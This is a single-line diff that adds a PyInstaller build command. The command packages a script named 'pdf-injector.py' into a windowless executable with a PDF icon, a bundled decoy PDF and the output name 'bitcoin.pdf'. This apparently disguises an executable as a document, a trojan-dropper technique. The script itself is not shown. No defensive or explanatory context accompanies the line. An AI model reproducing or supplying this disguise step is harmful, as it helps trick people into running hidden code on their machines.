@@ -1,0 +1,1 @@
+ pyinstaller --onefile --noconsole --icon=pdf.ico --add-data "bitcoin.pdf;." --name bitcoin.pdf pdf-injector.py
